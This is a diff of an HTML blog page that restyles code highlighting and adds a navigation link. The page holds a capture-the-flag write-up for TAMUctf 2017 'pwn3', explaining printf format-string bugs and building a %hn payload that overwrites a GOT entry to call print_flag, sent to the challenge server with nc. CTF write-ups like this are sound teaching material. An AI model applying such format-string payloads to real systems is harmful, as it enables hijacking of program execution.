@@ -30,6 +30,7 @@
     <link rel="stylesheet" href="https://storage.googleapis.com/code.getmdl.io/1.1.3/material.grey-orange.min.css"/>
     <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
     <link rel="stylesheet" href="/css/hmdl-style.css"/>
+	<link rel="stylesheet" href="/css/pygment.css">
 
 
 
@@ -84,26 +85,26 @@
 <p><img src="/assets/1-pwn3_description.png" alt="Pwn3 challenge description" /></p>
 
 <p>Here we are, with another pwning challenge. Let&rsquo;s start :grin:.</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ wget https://ctf.tamu.edu/files/e02cea87728137d5da449db45dcb875e/pwn3
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ wget https://ctf.tamu.edu/files/e02cea87728137d5da449db45dcb875e/pwn3
 $ r2 pwn3
-<span style="color: #f92672">[</span>0x080484b0<span style="color: #f92672">]</span>&gt; aaa
-<span style="color: #f92672">[</span>0x080484b0<span style="color: #f92672">]</span>&gt; afl
+<span class="o">[</span>0x080484b0<span class="o">]</span>&gt; aaa
+<span class="o">[</span>0x080484b0<span class="o">]</span>&gt; afl
 .
 .
-0x080485ab    <span style="color: #ae81ff">4</span> <span style="color: #ae81ff">103</span>          sym.print_flag
-0x08048612    <span style="color: #ae81ff">1</span> <span style="color: #ae81ff">102</span>          sym.main
+0x080485ab    <span class="m">4</span> <span class="m">103</span>          sym.print_flag
+0x08048612    <span class="m">1</span> <span class="m">102</span>          sym.main
 .
 .
-</pre></div>
+</code></pre></div>
 
 <p>Two interesting functions, and again, one of them is never called.</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span><span style="color: #f92672">[</span>0x080484b0<span style="color: #f92672">]</span>&gt; axt sym.print_flag <span style="color: #75715e"># Search for cross references to this function in the entire binary</span>
-<span style="color: #f92672">[</span>0x080484b0<span style="color: #f92672">]</span>&gt;
-</pre></div>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span><span class="o">[</span>0x080484b0<span class="o">]</span>&gt; axt sym.print_flag <span class="c1"># Search for cross references to this function in the entire binary</span>
+<span class="o">[</span>0x080484b0<span class="o">]</span>&gt;
+</code></pre></div>
 
 <p>Lets check what is happing inside the main one.</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span><span style="color: #f92672">[</span>0x080484b0<span style="color: #f92672">]</span>&gt; pdf @ main
-</pre></div>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span><span class="o">[</span>0x080484b0<span class="o">]</span>&gt; pdf @ main
+</code></pre></div>
 
 <p><img src="/assets/2-pwn3_main.png" alt="Pwn3 challenge description" /></p>
 
@@ -148,16 +149,16 @@ We are being able to see the content of the stack remotely!</p>
 <code>%n</code> modifier writes <strong>the LENGTH of the string</strong> in the address provided by the user <strong>before</strong> the modifier itself.</p>
 
 <p>Lets see an example:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">c;</span>
-<span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;12345 %n blah</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f92672">&amp;</span><span style="color: #f8f8f2">c);</span>
-<span style="color: #75715e">// Here c will be 6 because &quot;12345 &quot; is 6 bytes length!</span>
-</pre></div>
+<div class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span></span><span class="kt">int</span> <span class="n">c</span><span class="p">;</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">&quot;12345 %n blah</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">c</span><span class="p">);</span>
+<span class="c1">// Here c will be 6 because &quot;12345 &quot; is 6 bytes length!</span>
+</code></pre></div>
 
 <p>So, lets try all of this out, the idea is to send a memory address, locate where is it into the stack and use the <code>%n</code> format parameter to save data in the memory address we provide.</p>
 
 <p>We will input 4 As (&ldquo;AAAA&rdquo;, which will be written in memory as <code>0x41414141</code> and easier to locate), several <code>%p</code> to see the stack content and find out where the &ldquo;AAAA&rdquo; string is allocated inside of the stack.</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ python -c <span style="color: #e6db74">&#39;print(&quot;AAAA&quot; + &quot;%p %p %p %p %p &quot;)&#39;</span> <span style="color: #f8f8f2">|</span> ./pwn3<span style="color: #f8f8f2">;</span> <span style="color: #f8f8f2">echo</span>
-</pre></div>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;AAAA&quot; + &quot;%p %p %p %p %p &quot;)&#39;</span> <span class="p">|</span> ./pwn3<span class="p">;</span> <span class="nb">echo</span>
+</code></pre></div>
 
 <p><img src="/assets/6-pwn3_printf_leak_addr.png" alt="Pwn3 leaking some stack pointers" /></p>
 
@@ -165,8 +166,8 @@ We are being able to see the content of the stack remotely!</p>
 &gt; What a mess! what then?</p>
 
 <p>Indeed, It does exist another way of printing that 4^th^ value much more convenient for us: the index operator.</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ python -c <span style="color: #e6db74">&#39;print(&quot;AAAA&quot; + &quot;%4$p&quot;)&#39;</span> <span style="color: #f8f8f2">|</span> ./pwn3<span style="color: #f8f8f2">;</span> <span style="color: #f8f8f2">echo</span>
-</pre></div>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;AAAA&quot; + &quot;%4$p&quot;)&#39;</span> <span class="p">|</span> ./pwn3<span class="p">;</span> <span class="nb">echo</span>
+</code></pre></div>
 
 <p>Basically using <code>&lt;number&gt;$</code> we are able to select the position of the data we want to select.</p>
 
@@ -186,8 +187,8 @@ Here is where the GOT table enters the scene.</p>
 <p>The GOT is a table inside every process and the addresses it contains have addresses to these shared functions.
 Because all of thess functions are being used inside our binary, we could to try to modify the value which points to one of them.
 For that, we need to know, the specific function (and its address) of the GOT we want to modify. The following command will help us with that task.</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ objdump -R pwn3
-</pre></div>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ objdump -R pwn3
+</code></pre></div>
 
 <p><img src="/assets/8-pwn3_objdump.png" alt="Pwn3 GOT table with objdump" /></p>
 
@@ -200,14 +201,14 @@ Radare2 will give us the answer.</p>
 
 <p>Finally, we just need to know the value to write in that address. That value is nothing more than a memory address that contains the code we want to be executed. Can you think of what value it can be?
 Lets check again the functions r2 :smiley:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span><span style="color: #f92672">[</span>0x080484b0<span style="color: #f92672">]</span>&gt; afl
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span><span class="o">[</span>0x080484b0<span class="o">]</span>&gt; afl
 .
 .
-0x080485ab    <span style="color: #ae81ff">4</span> <span style="color: #ae81ff">103</span>          sym.print_flag
-0x08048612    <span style="color: #ae81ff">1</span> <span style="color: #ae81ff">102</span>          sym.main
+0x080485ab    <span class="m">4</span> <span class="m">103</span>          sym.print_flag
+0x08048612    <span class="m">1</span> <span class="m">102</span>          sym.main
 .
 .
-</pre></div>
+</code></pre></div>
 
 <blockquote>
 <p>That&rsquo;s it! the address of <code>sym.print_flag</code>! (<code>0x080485ab</code>)</p>
@@ -217,23 +218,23 @@ Lets check again the functions r2 :smiley:</p>
 
 <ol>
 <li><p>We have the place where the address will be stored: the 4^th^ position:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ python -c <span style="color: #e6db74">&#39;print(&quot;AAAA&quot; + &quot;%4$p&quot;)&#39;</span> <span style="color: #f8f8f2">|</span> ./pwn3<span style="color: #f8f8f2">;</span> <span style="color: #f8f8f2">echo</span>
-</pre></div></li>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;AAAA&quot; + &quot;%4$p&quot;)&#39;</span> <span class="p">|</span> ./pwn3<span class="p">;</span> <span class="nb">echo</span>
+</code></pre></div></li>
 
 <li><p>We have the address to write to.</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ python -c <span style="color: #e6db74">&#39;print(&quot;\x1c\xa0\x04\x08&quot; + &quot;%4$p&quot;)&#39;</span> <span style="color: #f8f8f2">|</span> ./pwn3<span style="color: #f8f8f2">;</span> <span style="color: #f8f8f2">echo</span>
-</pre></div></li>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;\x1c\xa0\x04\x08&quot; + &quot;%4$p&quot;)&#39;</span> <span class="p">|</span> ./pwn3<span class="p">;</span> <span class="nb">echo</span>
+</code></pre></div></li>
 
 <li><p>And here comes the last obstacle: We need to write the hex value <strong>0x080485ab</strong> through the <code>%n</code> operator.<br />
 We know <code>%n</code> can write the length of the string with preceeds itself into the provided address, so at a first glance we could think in writing <strong>134,514,087</strong> (134,514,091 - 4 (we already wrote a 4-byte address)) chars:</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ python -c <span style="color: #e6db74">&#39;print(&quot;\x1c\xa0\x04\x08&quot; + &quot;A&quot;*134514087 + &quot;%4$n&quot;)&#39;</span> <span style="color: #f8f8f2">|</span> ./pwn3<span style="color: #f8f8f2">;</span> <span style="color: #f8f8f2">echo</span>
-</pre></div>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;\x1c\xa0\x04\x08&quot; + &quot;A&quot;*134514087 + &quot;%4$n&quot;)&#39;</span> <span class="p">|</span> ./pwn3<span class="p">;</span> <span class="nb">echo</span>
+</code></pre></div>
 
 <p><img src="/assets/10-pwn3_broken_pipe.png" alt="Pwn3 broken pipe error" />
 But aparently that is just to much for the pipe.<br />
 We could try the <code>%&lt;times&gt;x</code> parameter. It just print as many memory bytes as we tell it to.</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ python -c <span style="color: #e6db74">&#39;print(&quot;\x1c\xa0\x04\x08&quot; + &quot;%x&quot;*134514087 + &quot;%4$n&quot;)&#39;</span> <span style="color: #f8f8f2">|</span> ./pwn3<span style="color: #f8f8f2">;</span> <span style="color: #f8f8f2">echo</span>
-</pre></div>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;\x1c\xa0\x04\x08&quot; + &quot;%x&quot;*134514087 + &quot;%4$n&quot;)&#39;</span> <span class="p">|</span> ./pwn3<span class="p">;</span> <span class="nb">echo</span>
+</code></pre></div>
 
 <p><img src="/assets/11-pwn3_broken_pipe_2.png" alt="Pwn3 broken pipe error 2" />
 Meh! same result.<br />
@@ -248,17 +249,17 @@ Let&rsquo;s represent this.</p>
 <p><img src="/assets/12-pwn3_scheme.png" alt="Pwn3 Scheme" /></p>
 
 <p>Then, it makes sense that the first value to be written should be the lowest one <code>0x804-8 = 2044</code> in the address <code>0804a01e</code> (provided in big endian) which will be stored in the <code>4th</code> position of the stack.</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ python -c <span style="color: #e6db74">&#39;print(&quot;\x1e\xa0\x04\x08&quot; + &quot;addr2&quot; + &quot;%2044x&quot; + &quot;%4$hn&quot; + &quot;%____x&quot; + &quot;%_$hn&quot;)&#39;</span>
-</pre></div>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;\x1e\xa0\x04\x08&quot; + &quot;addr2&quot; + &quot;%2044x&quot; + &quot;%4$hn&quot; + &quot;%____x&quot; + &quot;%_$hn&quot;)&#39;</span>
+</code></pre></div>
 
 <p>The second value to be written is the biggest one <code>0x85ab - (2044 + 8) = 32167</code> in the address <code>0804a01c</code> which will be stored in the <code>5th</code> position of the stack.</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ python -c <span style="color: #e6db74">&#39;print(&quot;\x1e\xa0\x04\x08&quot; + &quot;\x1c\xa0\x04\x08&quot; + &quot;%2044x&quot; + &quot;%4$hn&quot; + &quot;%32167x&quot; + &quot;%5$hn&quot;)&#39;</span>
-</pre></div>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;\x1e\xa0\x04\x08&quot; + &quot;\x1c\xa0\x04\x08&quot; + &quot;%2044x&quot; + &quot;%4$hn&quot; + &quot;%32167x&quot; + &quot;%5$hn&quot;)&#39;</span>
+</code></pre></div>
 
 <p>Finally! lets try it!</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ python -c <span style="color: #e6db74">&#39;print(&quot;\x1e\xa0\x04\x08&quot; + &quot;\x1c\xa0\x04\x08&quot; + &quot;%2044x&quot; + &quot;%4$hn&quot; + &quot;%32167x&quot; + &quot;%5$hn&quot;)&#39;</span> <span style="color: #ae81ff">\</span>
-<span style="color: #f8f8f2">|</span> nc pwn.ctf.tamu.edu <span style="color: #ae81ff">4323</span>
-</pre></div>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ python -c <span class="s1">&#39;print(&quot;\x1e\xa0\x04\x08&quot; + &quot;\x1c\xa0\x04\x08&quot; + &quot;%2044x&quot; + &quot;%4$hn&quot; + &quot;%32167x&quot; + &quot;%5$hn&quot;)&#39;</span> <span class="se">\</span>
+<span class="p">|</span> nc pwn.ctf.tamu.edu <span class="m">4323</span>
+</code></pre></div>
 
 <p><img src="/assets/13-pwn3_getting_the_flag.png" alt="Pwn3 Scheme" /></p>
 
@@ -269,8 +270,8 @@ Let&rsquo;s represent this.</p>
 <p><a href="https://asciinema.org/a/8dtrs5jltesk48y8ch5ouwrkn?autoplay=1" target="_blank"><img src="https://asciinema.org/a/8dtrs5jltesk48y8ch5ouwrkn.png" /></a></p>
 
 <h3 id="notes-for-the-author">Notes for the author</h3>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span></span>$ r2 -X <span style="color: #e6db74">&quot;stdin=\&quot;`python -c &#39;print(\&quot;\x1e\xa0\x04\x08\x1c\xa0\x04\x08\&quot; + \&quot;%2044x%4</span><span style="color: #f8f8f2">$hn</span><span style="color: #e6db74">\&quot; + \&quot;%32167x%5</span><span style="color: #f8f8f2">$hn</span><span style="color: #e6db74">\&quot;)&#39;`\&quot;&quot;</span> -d pwn3
-</pre></div>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ r2 -X <span class="s2">&quot;stdin=\&quot;`python -c &#39;print(\&quot;\x1e\xa0\x04\x08\x1c\xa0\x04\x08\&quot; + \&quot;%2044x%4</span><span class="nv">$hn</span><span class="s2">\&quot; + \&quot;%32167x%5</span><span class="nv">$hn</span><span class="s2">\&quot;)&#39;`\&quot;&quot;</span> -d pwn3
+</code></pre></div>
 
 <h3 id="tools-used-and-some-references">Tools used and some references:</h3>
 
@@ -296,13 +297,19 @@ Let&rsquo;s represent this.</p>
                     </div>  
                 </div>                
                 <nav class="mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
-                    <a href="/post/tamuctf2017/pwn4/">
+                    <a href="/post/tamuctf2017/pwn2/">
                         <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                         <i class="icon ion-android-arrow-back"></i>
                         </button>
                         Older
                     </a>
                     <div class="section-spacer"></div>
+                    <a href="/post/tamuctf2017/pwn4/">
+                        Newer
+                        <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                            <i class="icon ion-android-arrow-forward"></i>
+                        </button>
+                    </a>
                 </nav>
  
             </div>        
